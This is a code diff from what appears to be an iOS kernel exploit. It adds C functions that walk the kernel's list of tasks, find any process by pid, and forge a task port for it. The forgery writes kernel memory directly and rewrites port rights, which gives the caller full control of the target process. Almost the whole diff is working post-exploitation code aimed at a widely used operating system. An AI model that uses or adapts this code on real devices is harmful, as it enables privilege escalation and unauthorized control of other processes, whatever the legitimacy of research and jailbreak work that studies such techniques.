@@ -438,7 +438,136 @@ mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
   return tfp0;
 }
 
+int enumerate_tasks(int (*f)(uint64_t, void* data), void* data) {
+    uint64_t task_self = task_self_addr();
+    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+    uint64_t next_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_NEXT));
 
+    while (struct_task != 0 && ((struct_task & 0xffff000000000000) == 0xffff000000000000) ) {
+        if (f(struct_task, data) != 0) return 0;
+        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
+    }
+
+    struct_task = next_task;
+    while (struct_task != 0 && ((struct_task & 0xffff000000000000) == 0xffff000000000000) ) {
+        if (f(struct_task, data) != 0) return 0;
+        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_NEXT));
+    }
+
+    return -1;
+}
+
+struct kerntask_for_pid_data {
+    uint64_t found_task;
+    pid_t pid;
+};
+
+static int kerntask_for_pid_inner(uint64_t struct_task, void* vdata) {
+    struct kerntask_for_pid_data *data = (struct kerntask_for_pid_data *) vdata;
+
+    uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+    if (bsd_info == 0) return 0;
+
+    uint32_t found_pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
+    if (found_pid == data->pid) {
+        data->found_task = struct_task;
+        return 1;
+    } else {
+        return 0;
+    }
+}
+
+uint64_t kerntask_for_pid(uint32_t pid) {
+    struct kerntask_for_pid_data pid_data = {0, pid};
+
+    if (enumerate_tasks(kerntask_for_pid_inner, &pid_data) == 0) {
+        return pid_data.found_task;
+    }
+
+    return -1;
+}
+
+mach_port_t build_fake_tfp(uint32_t pid) {
+    kern_return_t err;
+
+    mach_port_t tfp = MACH_PORT_NULL;
+    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tfp);
+    if (err != KERN_SUCCESS) {
+        printf("unable to allocate port\n");
+    }
+
+    uint64_t kernel_task_kaddr = kerntask_for_pid(pid);
+#if 0
+    uint64_t self_task = task_self_addr();
+    uint64_t self_proc = rk64(self_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+
+    uint64_t proc = self_proc;
+    int direction = 0;
+    // skips task self
+    for (;;) {
+        if (direction == 0) {
+            task = rk64(task + koffset(KSTRUCT_OFFSET_TASK_PREV));
+            if ((task & 0xfffffff000000000) == 0 || task == -1) {
+                direction = 1;
+                task = self_task;
+            }
+        }
+
+        if (direction == 1) {
+            task = rk64(task + koffset(KSTRUCT_OFFSET_TASK_NEXT));
+            if ((task & 0xfffffff000000000) == 0 || task == -1) {
+                break;
+            }
+        }
+
+        uint64_t proc = rk64(task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+        if (proc & 0xfffffff000000000) {
+            uint32_t current_pid = rk32(proc + koffset(KSTRUCT_OFFSET_PROC_PID));
+            printf("pid %u at 0x%llx\n", current_pid, proc);
+            if (current_pid == pid) {
+                kernel_task_kaddr = task;
+                break;
+            }
+        } else {
+            printf("bsdinfo looks invalid: 0x%llx\n", proc);
+        }
+    }
+#endif
+
+    if (kernel_task_kaddr == -1) {
+        printf("fake_tfp failed to find in-kernel struct task for pid %u\n", pid);
+        return MACH_PORT_NULL;
+    }
+
+    // now make the changes to the port object to make it a task port:
+    uint64_t port_kaddr = find_port_address(tfp, MACH_MSG_TYPE_MAKE_SEND);
+
+    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
+    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
+    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
+    wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), ipc_space_kernel());
+    wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  kernel_task_kaddr);
+
+    // swap our receive right for a send right:
+    uint64_t task_port_addr = task_self_addr();
+    uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+    uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
+    uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
+
+    uint32_t port_index = tfp >> 8;
+    const int sizeof_ipc_entry_t = 0x18;
+    uint32_t bits = rk32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
+
+#define IE_BITS_SEND (1<<16)
+#define IE_BITS_RECEIVE (1<<17)
+
+    bits &= (~IE_BITS_RECEIVE);
+    bits |= IE_BITS_SEND;
+
+    wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
+
+    return tfp;
+}
 
 // task_self_addr points to the struct ipc_port for our task port
 uint64_t find_kernel_vm_map(uint64_t task_self_addr) {
